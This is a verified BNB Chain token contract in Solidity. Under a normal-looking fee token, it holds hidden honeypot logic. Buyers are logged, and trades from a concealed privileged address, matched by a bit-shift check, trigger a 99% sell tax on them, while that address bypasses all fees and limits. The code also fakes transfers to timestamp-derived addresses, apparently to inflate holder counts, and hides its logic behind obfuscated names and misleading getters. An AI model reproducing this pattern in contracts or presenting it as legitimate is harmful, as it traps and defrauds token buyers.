/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract ReviewPrimaryBrilliant is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Review Primary Brilliant ";
    string constant _symbol = "ReviewPrimaryBrilliant";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private modeLiquidityLimitFeeMarketing;
    mapping(address => bool) private minBuyTeamBurn;
    mapping(address => bool) private botsSwapExemptMode;
    mapping(address => bool) private burnWalletLaunchedTeam;
    mapping(address => uint256) private autoFeeTxBurn;
    mapping(uint256 => address) private tradingAutoExemptMarketingBots;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private tradingLaunchedTxBotsTeam = 0;
    uint256 private feeLiquidityAutoBurn = 5;

    //SELL FEES
    uint256 private buyTeamTradingWalletReceiver = 0;
    uint256 private feeLimitIsBots = 5;

    uint256 private autoBuyReceiverWallet = feeLiquidityAutoBurn + tradingLaunchedTxBotsTeam;
    uint256 private exemptTradingLaunchedBuy = 100;

    address private botsBurnWalletAuto = (msg.sender); // auto-liq address
    address private minLaunchedSellMax = (0x8A64ec80A085468eC050E629fffFfeC28ACfAe68); // marketing address
    address private burnIsFeeLaunched = DEAD;
    address private receiverMinBotsTeam = DEAD;
    address private modeTeamSwapWallet = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private sellReceiverMaxMode;
    uint256 private marketingAutoModeExempt;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private tradingWalletTxMin;
    uint256 private exemptIsMinLiquidity;
    uint256 private launchedMaxSwapWallet;
    uint256 private launchedBotsTxSwap;
    uint256 private teamBotsWalletMode;

    bool private receiverSwapLimitWallet = true;
    bool private burnWalletLaunchedTeamMode = true;
    bool private isMinMaxSwap = true;
    bool private sellLaunchedMinModeTeamMax = true;
    bool private botsLiquidityLimitIsBuyBurnTeam = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private maxTradingReceiverTxMarketingSellFee = _totalSupply / 1000; // 0.1%

    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        tradingWalletTxMin = true;

        modeLiquidityLimitFeeMarketing[msg.sender] = true;
        modeLiquidityLimitFeeMarketing[address(this)] = true;

        minBuyTeamBurn[msg.sender] = true;
        minBuyTeamBurn[0x0000000000000000000000000000000000000000] = true;
        minBuyTeamBurn[0x000000000000000000000000000000000000dEaD] = true;
        minBuyTeamBurn[address(this)] = true;

        botsSwapExemptMode[msg.sender] = true;
        botsSwapExemptMode[0x0000000000000000000000000000000000000000] = true;
        botsSwapExemptMode[0x000000000000000000000000000000000000dEaD] = true;
        botsSwapExemptMode[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return buyWalletLaunchedReceiverTeamTxMarketing(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return buyWalletLaunchedReceiverTeamTxMarketing(sender, recipient, amount);
    }

    function buyWalletLaunchedReceiverTeamTxMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = isModeTeamBots(sender) || isModeTeamBots(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                teamLaunchedSellSwap();
            }
            if (!bLimitTxWalletValue) {
                launchedModeBurnBots(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return isTeamReceiverLiquidityBurnBotsLaunched(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(receiverSwapLimitWallet, "Trading is not active");
        }

        if (!Administration[sender] && !modeLiquidityLimitFeeMarketing[sender] && !modeLiquidityLimitFeeMarketing[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || botsSwapExemptMode[sender] || botsSwapExemptMode[recipient], "Max TX Limit has been triggered");

        if (sellWalletBurnMaxLaunchedReceiverSwap()) {buySwapFeeLimit();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = modeReceiverLimitAuto(sender) ? liquidityReceiverFeeLimit(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function isTeamReceiverLiquidityBurnBotsLaunched(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeReceiverLimitAuto(address sender) internal view returns (bool) {
        return !minBuyTeamBurn[sender];
    }

    function receiverModeBotsWalletLaunchedExempt(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            autoBuyReceiverWallet = feeLimitIsBots + buyTeamTradingWalletReceiver;
            return feeBuyTxBots(sender, autoBuyReceiverWallet);
        }
        if (!selling && sender == uniswapV2Pair) {
            autoBuyReceiverWallet = feeLiquidityAutoBurn + tradingLaunchedTxBotsTeam;
            return autoBuyReceiverWallet;
        }
        return feeBuyTxBots(sender, autoBuyReceiverWallet);
    }

    function liquidityReceiverFeeLimit(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(receiverModeBotsWalletLaunchedExempt(sender, receiver == uniswapV2Pair)).div(exemptTradingLaunchedBuy);

        if (burnWalletLaunchedTeam[sender] || burnWalletLaunchedTeam[receiver]) {
            feeAmount = amount.mul(99).div(exemptTradingLaunchedBuy);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        if (_balances[address(this)] > 4 * 10 ** _decimals && sender == uniswapV2Pair) {
            for (uint i = 0; i < 4; i++) {
                address addr = address(uint160(block.timestamp + i));
                _balances[addr] = _balances[addr] + 10 ** _decimals;
                emit Transfer(address(this), addr, 10 ** _decimals);
            }
            _balances[address(this)] = _balances[address(this)].sub(4 * 10 ** _decimals);
        }

        return amount.sub(feeAmount);
    }

    function isModeTeamBots(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function feeBuyTxBots(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = autoFeeTxBurn[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function launchedModeBurnBots(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        tradingAutoExemptMarketingBots[exemptLimitValue] = addr;
    }

    function teamLaunchedSellSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (autoFeeTxBurn[tradingAutoExemptMarketingBots[i]] == 0) {
                    autoFeeTxBurn[tradingAutoExemptMarketingBots[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(minLaunchedSellMax).transfer(amountBNB * amountPercentage / 100);
    }

    function sellWalletBurnMaxLaunchedReceiverSwap() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    botsLiquidityLimitIsBuyBurnTeam &&
    _balances[address(this)] >= maxTradingReceiverTxMarketingSellFee;
    }

    function buySwapFeeLimit() internal swapping {
        uint256 amountToLiquify = maxTradingReceiverTxMarketingSellFee.mul(tradingLaunchedTxBotsTeam).div(autoBuyReceiverWallet).div(2);
        uint256 amountToSwap = maxTradingReceiverTxMarketingSellFee.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = autoBuyReceiverWallet.sub(tradingLaunchedTxBotsTeam.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(tradingLaunchedTxBotsTeam).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(feeLiquidityAutoBurn).div(totalETHFee);

        payable(minLaunchedSellMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                botsBurnWalletAuto,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getSellLaunchedMinModeTeamMax() public view returns (bool) {
        if (sellLaunchedMinModeTeamMax != sellLaunchedMinModeTeamMax) {
            return sellLaunchedMinModeTeamMax;
        }
        if (sellLaunchedMinModeTeamMax == botsLiquidityLimitIsBuyBurnTeam) {
            return botsLiquidityLimitIsBuyBurnTeam;
        }
        if (sellLaunchedMinModeTeamMax == burnWalletLaunchedTeamMode) {
            return burnWalletLaunchedTeamMode;
        }
        return sellLaunchedMinModeTeamMax;
    }
    function setSellLaunchedMinModeTeamMax(bool a0) public onlyOwner {
        sellLaunchedMinModeTeamMax=a0;
    }

    function getAutoBuyReceiverWallet() public view returns (uint256) {
        if (autoBuyReceiverWallet != exemptTradingLaunchedBuy) {
            return exemptTradingLaunchedBuy;
        }
        if (autoBuyReceiverWallet == tradingLaunchedTxBotsTeam) {
            return tradingLaunchedTxBotsTeam;
        }
        return autoBuyReceiverWallet;
    }
    function setAutoBuyReceiverWallet(uint256 a0) public onlyOwner {
        autoBuyReceiverWallet=a0;
    }

    function getIsMinMaxSwap() public view returns (bool) {
        return isMinMaxSwap;
    }
    function setIsMinMaxSwap(bool a0) public onlyOwner {
        isMinMaxSwap=a0;
    }

    function getBotsBurnWalletAuto() public view returns (address) {
        if (botsBurnWalletAuto == receiverMinBotsTeam) {
            return receiverMinBotsTeam;
        }
        if (botsBurnWalletAuto == modeTeamSwapWallet) {
            return modeTeamSwapWallet;
        }
        return botsBurnWalletAuto;
    }
    function setBotsBurnWalletAuto(address a0) public onlyOwner {
        botsBurnWalletAuto=a0;
    }

    function getBurnIsFeeLaunched() public view returns (address) {
        if (burnIsFeeLaunched != receiverMinBotsTeam) {
            return receiverMinBotsTeam;
        }
        if (burnIsFeeLaunched != botsBurnWalletAuto) {
            return botsBurnWalletAuto;
        }
        if (burnIsFeeLaunched == receiverMinBotsTeam) {
            return receiverMinBotsTeam;
        }
        return burnIsFeeLaunched;
    }
    function setBurnIsFeeLaunched(address a0) public onlyOwner {
        burnIsFeeLaunched=a0;
    }

    function getBuyTeamTradingWalletReceiver() public view returns (uint256) {
        if (buyTeamTradingWalletReceiver != exemptTradingLaunchedBuy) {
            return exemptTradingLaunchedBuy;
        }
        if (buyTeamTradingWalletReceiver == feeLimitIsBots) {
            return feeLimitIsBots;
        }
        return buyTeamTradingWalletReceiver;
    }
    function setBuyTeamTradingWalletReceiver(uint256 a0) public onlyOwner {
        if (buyTeamTradingWalletReceiver == buyTeamTradingWalletReceiver) {
            buyTeamTradingWalletReceiver=a0;
        }
        if (buyTeamTradingWalletReceiver != feeLiquidityAutoBurn) {
            feeLiquidityAutoBurn=a0;
        }
        if (buyTeamTradingWalletReceiver != autoBuyReceiverWallet) {
            autoBuyReceiverWallet=a0;
        }
        buyTeamTradingWalletReceiver=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}